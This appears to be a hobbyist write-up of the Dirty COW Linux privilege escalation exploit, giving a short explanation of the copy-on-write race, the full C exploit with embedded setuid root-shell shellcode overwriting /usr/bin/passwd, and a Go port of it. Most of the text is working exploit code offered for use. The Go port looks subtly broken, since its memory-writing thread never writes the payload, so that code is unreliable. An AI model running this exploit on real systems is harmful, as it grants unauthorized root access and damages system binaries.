

The first one we are going to talk about is the

GoLang reWrite from C to go 

                                 ,        ,
                                /(        )`
                                \ \___   / |
                                /- _  `-/  '
                               (/\/ \ \   /\
                               / /   | `    \
                               O O   ) /    |
                               `-^--'`<     '
                   TM         (_.)  _  )   /
|  | |\  | ~|~ \ /             `.___/`    /
|  | | \ |  |   X                `-----' /
`__| |  \| _|_ / \  <----.     __ / __   \
                    <----|====O)))==) \) /====
                    <----'    `--' `.__,' \
                                 |        |
                                  \       /
                             ______( (_  / \______
                           ,'  ,-----'   |        \
                           `--{__________)        \/
 ___________________________________
< Local Privlege Escalation Exploit >
 -----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||                                   H
   ____________                                         _,,_H__
  (__((__((___()                                       //|     |
 (__((__((___()()_____________________________________// |ACME |
(__((__((___()()()------------------------------------'  |_____|
------------------------------------------------------------------
[+] Loading Standard Exploit.....



this one was pretty cool to actually work with and experiment, there 
is nothing to do that requires user interaction other than telling you 
in gneral what the dirty cow exploit is and how it works directly, 
and ofc showing the rewrite

so first off a breif breif description of dirty cow is just a 
Local Privlege Escalation exploit for all versions of the Linux Kernel 
since version 2.6. 22 but has been patched in newer versions

now the simple part of this is just explaining how it works which is 
just by exploiting the kernals COW ( Copy On Write ) which is a function
which is kalled in the kernal to in a sense hand data over or copy data to 
another file.

here is a thing i found a while back on understanding the dirty cow exploit

`````````````````
First, we create a private copy (mapping) of a read-only file. Second, we write to the private copy. Since it's our first time writing to the private copy, the COW feature takes place. The problem lies in the fact that this write consists of two non-atomic actions:

    locate physical address
    write to physical address

This means we can get right in the middle (via another thread) and tell the kernel to throw away our private copy â€” using madvise. This throwing away of the private copy results in the kernel accidentally writing to the original read-only file.
write	madvise
locate physical address	
	throw away private copy
write to physical address	

For a more detailed visual explanation, check out our demo page. It'll be fun!
````````````````````

now since i was learning go when i came across Dirty COW i decided to rewrite 
it in go, with newer functions and better ends, given how close C and go are it 
wasnt to hard to rewrite the exploit 

dirty cow exploit dirty_cow.c file main


/*
*
* EDB-Note: After getting a shell, doing "echo 0 > /proc/sys/vm/dirty_writeback_centisecs" may make the system more stable.
*
* (un)comment correct payload first (x86 or x64)!
* 
* $ gcc cowroot.c -o cowroot -pthread
* $ ./cowroot
* DirtyCow root privilege escalation
* Backing up /usr/bin/passwd.. to /tmp/bak
* Size of binary: 57048
* Racing, this may take a while..
* /usr/bin/passwd is overwritten
* Popping root shell.
* Don't forget to restore /tmp/bak
* thread stopped
* thread stopped
* root@box:/root/cow# id
* uid=0(root) gid=1000(foo) groups=1000(foo)
*/
 
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
 
void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;
 
// change if no permissions to read
char suid_binary[] = "/usr/bin/passwd";
 
/*
* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
*/
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;
 
/*
* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int sc_len = 136;
*/
 
void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("thread stopped\n");
}
 
void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        lseek(f,map,SEEK_SET);
        c+=write(f, str, sc_len);
    }
    printf("thread stopped\n");
}
 
void *waitForWrite(void *arg) {
    char buf[sc_len];
 
    for(;;) {
        FILE *fp = fopen(suid_binary, "rb");
 
        fread(buf, sc_len, 1, fp);
 
        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s is overwritten\n", suid_binary);
            break;
        }
 
        fclose(fp);
        sleep(1);
    }
 
    stop = 1;
 
    printf("Popping root shell.\n");
    printf("Don't forget to restore /tmp/bak\n");
 
    system(suid_binary);
}
 
int main(int argc,char *argv[]) {
    char *backup;
 
    printf("DirtyCow root privilege escalation\n");
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);
 
    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
    system(backup);
 
    f = open(suid_binary,O_RDONLY);
    fstat(f,&st);
 
    printf("Size of binary: %d\n", st.st_size);
 
    char payload[st.st_size];
    memset(payload, 0x90, st.st_size);
    memcpy(payload, sc, sc_len+1);
 
    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
 
    printf("Racing, this may take a while..\n");
 
    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
    pthread_create(&pth2, NULL, &procselfmemThread, payload);
    pthread_create(&pth3, NULL, &waitForWrite, NULL);
 
    pthread_join(pth3, NULL);
 
    return 0;
}


Rewrite ported from C into go

/*

Dirty Cow exploit ported from C into Go, OG reqrite
inspired by the original dirty cow exploit for

 ___________________________________
< Local Privlege Escalation Exploit >
 -----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||


OG C file -> dirty_cow.c

ArkAngeL43 OR ANY OTHER DEVELOPERS FOR RR5 CLAIM ANY MAIN OWNERSHIP
FOR DIRTY_COW.c


*/

package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"syscall"
	"time"
)

var standard = []byte{
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
	0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
	0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
	0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
	0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
}

var (
	proc               = "/proc/self/mem"
	banner             = "cow.txt"
	map_main           uintptr
	os_sig             = make(chan bool, 2)
	set_payload_custom = flag.String("binf", "", "set standard exploit")
)

const (
	SUID_BIN = "/usr/bin/passwd"
)

func banner_main(file string) {
	content, err := ioutil.ReadFile(file)
	if err != nil {
		log.Fatal(err)
	} else {
		fmt.Println("\033[31m", string(content))
	}

}

func error_check(err error, check_err_code int, msg string) bool {
	if err != nil {
		if msg == "" {
			fmt.Println(err, "ERROR FEILD EMPTY STANDARD ERROR UNKNOWN")
			os.Exit(1)
			return true
		} else {
			log.Fatal(msg, err)
			return true
		}
	}
	return false
}

func mad_vise() {
	for i := 0; i < 1000000; i++ {
		select {
		case <-os_sig:
			fmt.Println("\033[35m[+] MAD VISE Finished!")
			return

		default:
			syscall.Syscall(syscall.SYS_MADVISE, map_main, uintptr(100), syscall.MADV_DONTNEED)
		}
	}
}

func proc_memory(payload []byte) {
	open_proc, err := os.OpenFile(proc, syscall.O_RDWR, 0)
	error_check(err, 1, "\033[31m[!] COULD NOT OPEN PROC ")
	for i := 0; i < 1000000; i++ {
		select {
		case <-os_sig:
			fmt.Println("\033[35m[+] Proc Self mem Finished!")
			return
		default:
			syscall.Syscall(syscall.SYS_LSEEK, open_proc.Fd(), map_main, uintptr(os.SEEK_SET))
		}
	}
}

func write_wait() {
	buffer := make([]byte, len(standard))
	for {
		file, err := os.Open(SUID_BIN)
		error_check(err, 1, "ERROR OPENING BIN ")
		if _, err := file.Read(buffer); err != nil {
			panic(err)
		}
		file.Close()
		//
		if bytes.Compare(buffer, standard) == 0 {
			fmt.Println("[!] %s has been over written\n", SUID_BIN)
			break
		}
		time.Sleep(1 * time.Second)
	}
	os_sig <- true
	os_sig <- true
	fmt.Println("\033[32m[+] Popping R00T shell")
	fmt.Println("\033[31m[!] Do NOT forget to restore /tmp/bak\n")
	attr := os.ProcAttr{
		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
	}
	proc, err := os.StartProcess(SUID_BIN, nil, &attr)
	error_check(err, 1, "ERROR DURING OS EXECUTION START PROCESS")
	proc.Wait()
	os.Exit(0)
}

func attack_main() {
	fmt.Println("[ WARN ] Backing up %s to new directory => /tmp/bak", SUID_BIN)
	backup_SUID := exec.Command("cp", SUID_BIN, "/tmp/bak")
	if err := backup_SUID.Run(); err != nil {
		log.Fatal(err)
	}
	file, err := os.OpenFile(SUID_BIN, os.O_RDONLY, 0600)
	error_check(err, 1, "[!] could not open SUID BINARY FILE")
	state, err_stat := file.Stat()
	error_check(err_stat, 1, "[!] COULD NOT GET STAT OF FILE ")
	fmt.Println("[+] Current size of binary -> %d", state.Size())
	payload_main := make([]byte, state.Size())
	for i, _ := range payload_main {
		payload_main[i] = 0x90
	}
	for i, v := range standard {
		payload_main[i] = v
	}
	map_main, _, _ = syscall.Syscall6(
		syscall.SYS_MMAP,
		uintptr(0),
		uintptr(state.Size()),
		uintptr(syscall.PROT_READ),
		uintptr(syscall.MAP_PRIVATE),
		file.Fd(),
		0,
	)
	fmt.Println("Racing, this may take a while..\n")
	go mad_vise()
	go proc_memory(payload_main)
	write_wait()
}

func main() {
	banner_main(banner)
	attack_main()
}
